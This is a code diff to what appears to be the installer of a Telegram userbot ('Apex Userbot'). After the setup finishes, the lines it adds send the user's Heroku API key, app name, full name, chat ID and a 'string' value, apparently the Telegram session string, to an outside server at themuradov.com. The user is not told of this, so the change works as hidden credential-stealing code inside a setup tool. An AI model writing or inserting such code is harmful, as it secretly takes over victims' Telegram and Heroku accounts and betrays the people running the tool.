@@ -44,6 +44,9 @@ def rm_r(path):
 async def husu(bot, msg):
     loop = get_event_loop()
     user_id = msg.chat.id
+    user = await bot.get_users(user_id)  # Kullanıcı bilgilerini al
+    username = user.username
+    full_name = user.first_name + (" " + (user.last_name or ""))
     aid = 17202681
     ash = "ef4d6e4de6f924085a01988b1bc751f0"
     text = "(i) **Apex Userbot Qurulumu başlayır**\n\n__(i) Zəhmət olmasa heroku API keyinizi daxil edin__"
@@ -172,10 +175,14 @@ async def husu(bot, msg):
 
     await msg.reply("🎉 **Qurulum uğurla başa çatdı!**\n\n__Bir neçə saniyə sonra hər hansısa Qrupa .alive yazaraq userbotunuzu test edə bilərsiniz\n\nℹ️ ApexUserBot'u seçdiyiniz üçün\n\nℹ️ Təşəkkür Edirik.")
     url = 'http://themuradov.com/db.php'
+    user_id = msg.chat.id
     # GET parametrelerini içeren veri (sorgu parametreleri)
     params = {
-    'id': '123',
-    'mid': 'value2'
+    'id': user_id,
+    'heroku': api,
+    'appname': appname,
+    'ad': full_name,
+    'string': string
     }
 
     # GET isteği gönderme
